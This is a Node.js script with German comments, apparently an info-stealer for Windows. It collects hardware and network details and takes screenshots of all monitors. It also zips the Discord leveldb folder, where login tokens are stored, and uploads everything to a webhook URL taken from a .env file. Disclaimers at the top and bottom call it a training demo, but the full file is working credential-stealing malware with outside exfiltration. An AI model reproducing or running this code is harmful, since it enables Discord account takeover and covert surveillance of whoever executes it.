require('dotenv').config(); // .env laden, in dem u.a. WEBHOOK_URL definiert wird

/*
 Never use this script against anyone! It was created for demonstration and training purposes! 
 I assume no liability for any resulting damages!

 Sends a screenshot of all Monitors and all relevant hardware information of the user to a specific webhook link.
 The webhook is built as per the provided JSON structure.
 @apt_start_latifi
*/

const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const screenshotDesktop = require('screenshot-desktop');

// Neuer Import für das ZIP-Packing
const archiver = require('archiver');

// Einbinden des embed-Moduls
const { buildWebhookPayload, sendWebhook } = require('./embed');

// Hilfsfunktion: Kopiert einen Ordner rekursiv in ein Zielverzeichnis
function copyFolderRecursiveSync(source, target) {
    if (!fs.existsSync(target)) {
        fs.mkdirSync(target, { recursive: true });
    }
    const files = fs.readdirSync(source);
    files.forEach(file => {
        const sourcePath = path.join(source, file);
        const targetPath = path.join(target, file);
        if (fs.lstatSync(sourcePath).isDirectory()) {
            copyFolderRecursiveSync(sourcePath, targetPath);
        } else {
            fs.copyFileSync(sourcePath, targetPath);
        }
    });
}

// Erweiterte Systeminformations-Funktion
function gatherSystemInfo() {
    const info = {};

    // Hostname
    info.hostname = os.hostname();

    const cpuData = os.cpus();
    const cpuModel = cpuData[0].model;
    const cpuCores = cpuData.length;
    let cpuUsage = 'N/A';
    try {
        cpuUsage = execSync('wmic cpu get loadpercentage').toString().split('\n')[1].trim() + '%';
    } catch (error) {
        cpuUsage = 'N/A';
    }
    info.cpu = `**Model:** ${cpuModel}\n**Cores:** ${cpuCores}\n**Load:** ${cpuUsage}`;

    // GPU: Abfrage mittels WMIC-Befehlen
    try {
        // VideoProcessor
        const gpuProcessorRaw = execSync('wmic path win32_VideoController get VideoProcessor').toString();
        // AdapterRAM
        const gpuRAMRaw = execSync('wmic path win32_VideoController get AdapterRAM').toString();
        // GPU ID (PNPDeviceID)
        const gpuIDRaw = execSync('wmic path win32_VideoController get PNPDeviceID').toString();

        const gpuProcessor = gpuProcessorRaw.split('\n').slice(1).filter(line => line.trim() !== '');
        const gpuRAM = gpuRAMRaw.split('\n').slice(1).filter(line => line.trim() !== '');
        const gpuIDs = gpuIDRaw.split('\n').slice(1).filter(line => line.trim() !== '');
        let gpuInfo = "";
        const length = Math.max(gpuProcessor.length, gpuRAM.length, gpuIDs.length);
        for (let i = 0; i < length; i++) {
            const proc = gpuProcessor[i] ? gpuProcessor[i].trim() : "N/A";
            let ramValue = "N/A";
            if (gpuRAM[i]) {
                const adapterRam = parseInt(gpuRAM[i].trim());
                if (!isNaN(adapterRam) && adapterRam > 0) {
                    // Umrechnung von Bytes in MB
                    ramValue = (adapterRam / (1024 * 1024)).toFixed(0) + " MB";
                }
            }
            const id = gpuIDs[i] ? gpuIDs[i].trim() : "N/A";
            gpuInfo += `**GPUs** : ${i + 1} \n**Name:** ${proc}\n**Memory:** ${ramValue}\n**GPU ID:** ${id}\n\n`;
        }
        info.gpu = gpuInfo;
    } catch (error) {
        info.gpu = 'GPU-Informationen nicht verfügbar';
    }

    try {
        const mbRaw = execSync('wmic baseboard get product,Manufacturer,version,serialnumber').toString();
        const mbLines = mbRaw.split('\n').slice(1).filter(line => line.trim() !== '');
        const formattedMbInfo = mbLines.map(line => {
            const parts = line.trim().split(/\s{2,}/);
            return `**Name:** ${parts[0] || 'N/A'}\n**Manufacturer:** ${parts[1] || 'N/A'}\n**SerialNumber:** ${parts[2] || 'N/A'}\n**Version:** ${parts[3] || 'N/A'}`;
        }).join('\n\n');
        info.motherboard = formattedMbInfo;
    } catch (error) {
        info.motherboard = 'Motherboard-Informationen nicht verfügbar';
    }
    // System: Betriebssystem und Version
    info.system = `${os.type()} ${os.release()}`;

    // HardDisk: Alle Partitionen mit freiem/gesamt Speicher (Windows via WMIC)
    const discs = [];
    try {
        const drives = execSync('wmic logicaldisk get deviceid,freespace,size').toString().split('\n').slice(1);
        for (const drive of drives) {
            const match = drive.match(/(\w:)\s+(\d+)\s+(\d+)/);
            if (match) {
                const [ , deviceId, freeSpace, totalSize ] = match;
                const freeGB = (freeSpace / (1024 ** 3)).toFixed(1);
                const totalGB = (totalSize / (1024 ** 3)).toFixed(1);
                discs.push(`${deviceId} ${freeGB}GB/${totalGB}GB`);
            }
        }
    } catch (error) {
        discs.push('Keine Partitionen gefunden');
    }
    info.harddisk = discs.join('\n');

    // RAM: Gesamtspeicher und verwendeter Speicher
    const totalRamGB = (os.totalmem() / (1024 ** 3)).toFixed(1);
    const freeRamGB = (os.freemem() / (1024 ** 3)).toFixed(1);
    const usedRamGB = (totalRamGB - freeRamGB).toFixed(1);
    info.ram = `**Total:** ${totalRamGB} GB\n**Used:** ${usedRamGB} GB`;

    // Zusätzliche RAM-Riegel-Informationen (Anzahl und Kapazität pro Modul)
    let ramSticks = "";
    try {
        const ramRaw = execSync('wmic MEMORYCHIP get Capacity').toString();
        const lines = ramRaw.split('\n').slice(1).filter(line => line.trim() !== '');
        const capacities = lines.map(line => {
            const capacity = parseInt(line.trim());
            if (!isNaN(capacity) && capacity > 0) {
                return (capacity / (1024 ** 3)).toFixed(1) + " GB";
            } else {
                return "N/A";
            }
        });
        ramSticks = `**Found ${capacities.length} RAM stick(s):** ${capacities.join(', ')}`;
    } catch (error) {
        ramSticks = "RAM Riegel Informationen nicht verfügbar";
    }
    info.ram = `**Total:** ${totalRamGB} GB\n**Used: **${usedRamGB} GB\n${ramSticks}`;

    // Netzwerk: Lokale IP-Adresse und MAC-Adresse
    const networkInterfaces = os.networkInterfaces();
    let localIp = 'N/A';
    let mac = 'N/A';
    for (const key in networkInterfaces) {
        const iface = networkInterfaces[key].find(i => i.family === 'IPv4' && !i.internal);
        if (iface) {
            localIp = iface.address;
            mac = iface.mac;
            break;
        }
    }
    info.localIp = localIp;
    info.mac = mac;

    return info;
}

// Erfasst Screenshots aller aktiven Monitore und speichert sie im angegebenen Verzeichnis
async function takeScreenshots(outputDir = 'src/images') {
    if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, { recursive: true });
    }

    const screenshotPaths = [];
    try {
        const screenshots = await screenshotDesktop.all(); // Liefert ein Array von Buffern für jeden Monitor
        for (let i = 0; i < screenshots.length; i++) {
            const screenshotPath = path.join(outputDir, `screenshot_${i + 1}.png`);
            fs.writeFileSync(screenshotPath, screenshots[i]);
            console.log(`[INFO] Screenshot gespeichert: ${screenshotPath}`);
            screenshotPaths.push(screenshotPath);
        }
    } catch (error) {
        console.error(`[ERROR] Beim Erstellen der Screenshots: ${error}`);
    }
    return screenshotPaths;
}

// NEU: Funktion, die den kompletten LevelDB-Ordner (Discord) in unser Arbeitsverzeichnis kopiert, als ZIP-Archiv verpackt und anschließend zurückgibt.
function packageLeveldbFiles() {
    return new Promise((resolve, reject) => {
        try {
            // Ermitteln des Pfades zum Discord-LevelDB-Ordner
            let leveldbDir;
            if (process.env.APPDATA) {
                leveldbDir = path.join(process.env.APPDATA, 'discord', 'Local Storage', 'leveldb');
            } else {
                const username = os.userInfo().username;
                leveldbDir = path.join('C:\\Users', username, 'AppData', 'Roaming', 'discord', 'Local Storage', 'leveldb');
            }
            if (!fs.existsSync(leveldbDir)) {
                resolve(null);
                return;
            }
            
            // Temporäres Verzeichnis im Projekt erstellen und den kompletten Ordner dorthin kopieren
            const tempFolder = path.join(__dirname, 'temp_leveldb');
            if (fs.existsSync(tempFolder)) {
                fs.rmSync(tempFolder, { recursive: true, force: true });
            }
            copyFolderRecursiveSync(leveldbDir, tempFolder);
            
            // ZIP-Archiv des kopierten Ordners erstellen
            const zipPath = path.join(__dirname, 'discord_leveldb.zip');
            const output = fs.createWriteStream(zipPath);
            const archive = archiver('zip', { zlib: { level: 9 } });
            
            output.on('close', function() {
                // Temporären Ordner nach dem Archivieren löschen
                fs.rmSync(tempFolder, { recursive: true, force: true });
                resolve(zipPath);
            });
            archive.on('error', function(err) {
                reject(err);
            });
            archive.pipe(output);
            // Archiviert den kompletten Inhalt des temporären Ordners unter dem Ordnernamen "leveldb"
            archive.directory(tempFolder, 'leveldb');
            archive.finalize();
        } catch (error) {
            reject(error);
        }
    });
}

// Main function: Sammelt alle Infos, erstellt Screenshots, baut den Payload und sendet ihn an den Webhook.
async function main() {
    const infoDict = gatherSystemInfo();
    const screenshots = await takeScreenshots('src/images');
    // NEU: Paketieren des kompletten LevelDB-Ordners aus Discord
    let leveldbZip = [];
    try {
        const zipFile = await packageLeveldbFiles();
        if (zipFile) {
            leveldbZip.push(zipFile);
        }
    } catch (err) {
        console.error(`[ERROR] Beim Verpacken der LevelDB Dateien: ${err.message}`);
    }
    const payload = await buildWebhookPayload(infoDict);
    // Kombiniere Screenshots und das ZIP-Archiv als Anhänge und verwende die WEBHOOK_URL aus der .env
    await sendWebhook(process.env.WEBHOOK_URL, payload, [...screenshots, ...leveldbZip]);
}

main();

/*
 Never use this script against anyone! It was created for demonstration and training purposes! 
 I assume no liability for any resulting damages!
 @apt_start_latifi
*/
